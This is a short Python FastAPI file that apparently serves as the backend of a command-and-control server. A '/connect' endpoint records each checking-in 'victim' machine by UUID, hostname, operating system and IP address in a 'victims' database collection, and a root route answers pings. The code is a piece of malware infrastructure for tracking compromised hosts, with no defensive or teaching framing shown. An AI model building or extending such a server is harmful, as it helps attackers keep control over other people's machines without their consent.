from uuid import UUID
from fastapi import FastAPI, Response, status
from models.victim import Victim
from data.db import db

server = FastAPI()

@server.get("/", status_code=status.HTTP_204_NO_CONTENT, response_class=Response)
async def ping():
    return None


@server.post("/connect", status_code=status.HTTP_204_NO_CONTENT, response_class=Response)
async def connect(victim:Victim, response: Response):
    if db.victims.find_one({"UUID":victim.UUID}) is None:
        db.victims.insert_one({"UUID":victim.UUID, "name":victim.name, "OS":victim.OS, "IP":victim.IP})
        response.status_code = status.HTTP_201_CREATED
    return None
    
